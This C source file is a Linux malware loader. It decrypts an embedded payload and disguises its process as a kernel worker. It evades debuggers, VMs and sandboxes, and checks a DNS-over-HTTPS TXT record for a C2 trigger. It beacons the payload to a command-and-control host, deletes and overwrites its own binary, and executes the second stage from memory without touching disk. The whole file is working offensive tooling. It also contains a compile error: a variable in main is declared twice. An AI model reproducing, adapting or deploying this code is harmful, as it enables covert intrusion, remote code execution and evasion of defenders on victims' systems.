#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <errno.h>
#include <time.h>
#include <stdint.h>
#include <linux/memfd.h>
#include <sys/ptrace.h>
#include <openssl/evp.h>
#include <openssl/hkdf.h>
#include <curl/curl.h>
#include <dlfcn.h>
#include "junk.h"  // Generated per build for JUNK_ASM

extern char **environ;

// Encrypted payload and IV (replaced at build time)
unsigned char encrypted_payload[] = "__ENCRYPTED_PAYLOAD__";
unsigned char iv[] = "__IV__";
const unsigned char base_key[] = "__BASE_KEY__";
size_t payload_len = sizeof(encrypted_payload);

// Feature flags
int flag_no_doh = 0;
int flag_no_selfdelete = 0;
int flag_fallback_only = 0;

// XOR key for in-memory encryption
unsigned char xor_key = 0xAA;

// Get RDTSC timestamp
unsigned long get_rdtsc() {
    unsigned int lo, hi;
    asm volatile ("rdtsc" : "=a"(lo), "=d"(hi));
    return ((unsigned long)hi << 32) | lo;
}

// AES + HKDF decryption
void decrypt_payload(unsigned char *decrypted_payload) {
    unsigned char salt[16];
    unsigned long tsc = get_rdtsc();
    for (int i = 0; i < 16; i++) {
        salt[i] = (tsc >> (i * 8)) & 0xFF;
    }

    unsigned char derived_key[32];
    if (HKDF(derived_key, 32, EVP_sha256(), base_key, sizeof(base_key) - 1, salt, 16, NULL, 0) != 1) {
        exit(1);
    }

    JUNK_ASM;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) exit(1);

    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, derived_key, iv);
    int len;
    EVP_DecryptUpdate(ctx, decrypted_payload, &len, encrypted_payload, payload_len);
    int plen = len;
    EVP_DecryptFinal_ex(ctx, decrypted_payload + len, &len);
    payload_len = plen + len;

    EVP_CIPHER_CTX_free(ctx);
}

// XOR encrypt/decrypt in memory
void xor_memory(unsigned char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// Anti-debugging via TracerPid
int is_debugged() {
    char buf[256];
    int fd = syscall(SYS_open, "/proc/self/status", O_RDONLY);
    if (fd < 0) return 0;
    ssize_t n = syscall(SYS_read, fd, buf, sizeof(buf) - 1);
    syscall(SYS_close, fd);
    if (n <= 0) return 0;
    buf[n] = '\0';
    char *tracer = strstr(buf, "TracerPid:");
    if (tracer) {
        return atoi(tracer + 10) != 0;
    }
    return 0;
}

// DNS-over-HTTPS C2 trigger with TXT parsing
size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t total = size * nmemb;
    char *ptr = malloc(total + 1);
    if (!ptr) return 0;
    memcpy(ptr, contents, total);
    ptr[total] = '\0';
    *(char **)userp = ptr;
    return total;
}

int doh_c2_trigger() {
    if (flag_no_doh) return 0;
    CURL *curl = curl_easy_init();
    if (!curl) return -1;
    char *response = NULL;
    curl_easy_setopt(curl, CURLOPT_URL, "https://dns.google/resolve?name=c2.example.com&type=TXT");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    CURLcode res = curl_easy_perform(curl);
    int result = -1;
    if (res == CURLE_OK && response) {
        if (strstr(response, "\"C2_TRIGGER:1\"")) {
            result = 0;
        }
        free(response);
    }
    curl_easy_cleanup(curl);
    return result;
}

// Telemetry beacon (C2 callback)
void send_beacon(unsigned char *shellcode, size_t shellcode_len) {
    CURL *curl = curl_easy_init();
    if (!curl) return;

    // Base64 encode shellcode (simplified; assumes EVP_EncodeBlock available)
    char *base64_shellcode = malloc(((shellcode_len + 2) / 3) * 4 + 1);
    if (!base64_shellcode) return;
    int encoded_len = EVP_EncodeBlock((unsigned char *)base64_shellcode, shellcode, shellcode_len);
    base64_shellcode[encoded_len] = '\0';

    // Randomize Host header (example with fixed domain)
    char host_header[64];
    snprintf(host_header, sizeof(host_header), "Host: %s", "c2.example.com");

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, host_header);
    headers = curl_slist_append(headers, "Content-Type: application/octet-stream");

    curl_easy_setopt(curl, CURLOPT_URL, "https://c2.example.com/beacon");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, base64_shellcode);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    curl_easy_perform(curl);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    free(base64_shellcode);
}

// Second-stage loader (dlopen from memory)
void load_second_stage(unsigned char *decrypted_payload) {
    int fd = syscall(SYS_memfd_create, "second_stage", MFD_CLOEXEC);
    if (fd < 0) return;
    syscall(SYS_write, fd, decrypted_payload, payload_len);
    char path[32] = "/proc/self/fd/";
    char fd_str[16];
    snprintf(fd_str, sizeof(fd_str), "%d", fd);
    strcat(path, fd_str);
    void *handle = dlopen(path, RTLD_LAZY);
    if (handle) {
        void (*entry)() = dlsym(handle, "entry");
        if (entry) entry();
        dlclose(handle);
    }
    syscall(SYS_close, fd);
}

// Wipe argv and environ
void nuke_args_env(int argc, char **argv) {
    for (int i = 0; i < argc; i++) {
        memset(argv[i], 0, strlen(argv[i]));
    }
    for (char **e = environ; *e; e++) {
        memset(*e, 0, strlen(*e));
    }
    JUNK_ASM;
}

// Memory-only execution
void exec_memfd(unsigned char *decrypted_payload) {
    int fd = syscall(SYS_memfd_create, "arc", MFD_CLOEXEC);
    if (fd < 0) return;
    syscall(SYS_write, fd, decrypted_payload, payload_len);
    char path[32] = "/proc/self/fd/";
    char fd_str[16];
    snprintf(fd_str, sizeof(fd_str), "%d", fd);
    strcat(path, fd_str);
    char *empty_argv[] = { NULL };
    char *empty_envp[] = { NULL };
    syscall(SYS_execve, path, empty_argv, empty_envp);
    syscall(SYS_close, fd);
}

// Scramble self with syscalls
void scramble_self() {
    int fd = syscall(SYS_open, "/proc/self/exe", O_WRONLY);
    if (fd < 0) return;
    char junk[4096];
    memset(junk, 0xCC, sizeof(junk));
    for (int i = 0; i < 100; i++) {
        syscall(SYS_lseek, fd, i * 4096, SEEK_SET);
        syscall(SYS_write, fd, junk, sizeof(junk));
    }
    syscall(SYS_close, fd);
}

// Anti-debugging
void anti_debug() {
    if (is_debugged() || syscall(SYS_ptrace, PTRACE_TRACEME, 0, 1, 0) < 0) {
        syscall(SYS_kill, getpid(), SIGKILL);
    }
}

// Unlink self
void unlink_self() {
    if (flag_no_selfdelete) return;
    char path[256];
    ssize_t len = syscall(SYS_readlink, "/proc/self/exe", path, sizeof(path) - 1);
    if (len > 0) {
        path[len] = '\0';
        syscall(SYS_unlink, path);
    }
}

// Fake process name
void set_fake_name() {
    syscall(SYS_prctl, PR_SET_NAME, "[kworker/u64:2]", 0, 0, 0);
}

// Fallback HTTP server
void fallback_http(unsigned char *decrypted_payload) {
    if (!flag_fallback_only) return;
    int sockfd = syscall(SYS_socket, AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = { AF_INET, htons(8080), { INADDR_ANY } };
    syscall(SYS_bind, sockfd, (struct sockaddr*)&addr, sizeof(addr));
    syscall(SYS_listen, sockfd, 5);
    printf("[*] Fallback HTTP server on :8080\n");
    while (1) {
        int client = syscall(SYS_accept, sockfd, NULL, NULL);
        syscall(SYS_write, client, decrypted_payload, payload_len);
        syscall(SYS_close, client);
    }
}

// Anti-VM check via CPUID
int is_vm() {
    char vendor[13];
    unsigned int eax, ebx, ecx, edx;
    __asm__ __volatile__ ("cpuid" : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx) : "a"(0));
    memcpy(vendor, &ebx, 4);
    memcpy(vendor + 4, &edx, 4);
    memcpy(vendor + 8, &ecx, 4);
    vendor[12] = '\0';
    if (!strcmp(vendor, "VMwareVMware") || !strcmp(vendor, "KVMKVMKVM")) {
        return 1;
    }
    return syscall(SYS_sysconf, _SC_NPROCESSORS_ONLN) < 2;
}

// Parse command-line flags
void parse_flags(int argc, char **argv) {
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--no-doh") == 0) flag_no_doh = 1;
        else if (strcmp(argv[i], "--no-selfdelete") == 0) flag_no_selfdelete = 1;
        else if (strcmp(argv[i], "--fallback-only") == 0) flag_fallback_only = 1;
    }
}

int main(int argc, char **argv) {
    parse_flags(argc, argv);
    set_fake_name();
    nuke_args_env(argc, argv);
    anti_debug();

    // Anti-sandbox timing check
    struct timespec start, end, req = {0, 1000000}; // 1ms
    syscall(SYS_clock_gettime, CLOCK_MONOTONIC, &start);
    syscall(SYS_nanosleep, &req, NULL);
    syscall(SYS_clock_gettime, CLOCK_MONOTONIC, &end);
    double elapsed = (end.tv_sec - start.tv_sec) * 1000.0 + (end.tv_nsec - start.tv_nsec) / 1000000.0;
    if (elapsed < 0.5 || elapsed > 1.5) exit(1);

    // Anti-VM check
    if (is_vm()) exit(1);

    unsigned char *decrypted_payload = malloc(payload_len);
    if (!decrypted_payload) exit(1);

    decrypt_payload(decrypted_payload);

    // XOR encrypt in memory
    xor_memory(decrypted_payload, payload_len, xor_key);

    // Section erasure with mprotect
    size_t page_size = sysconf(_SC_PAGESIZE);
    void *start = (void *)((uintptr_t)encrypted_payload & ~(page_size - 1));
    size_t len = (((uintptr_t)encrypted_payload + sizeof(encrypted_payload) + page_size - 1) & ~(page_size - 1)) - (uintptr_t)start;
    mprotect(start, len, PROT_NONE);

    if (doh_c2_trigger() == 0) {
        printf("[*] C2 trigger successful\n");
    }

    // Send beacon
    send_beacon(decrypted_payload, payload_len);

    // XOR decrypt for execution
    xor_memory(decrypted_payload, payload_len, xor_key);

    unlink_self();
    scramble_self();

    if (!flag_fallback_only) {
        load_second_stage(decrypted_payload);
        exec_memfd(decrypted_payload);
    } else {
        fallback_http(decrypted_payload);
    }

    free(decrypted_payload);
    return 0;
}
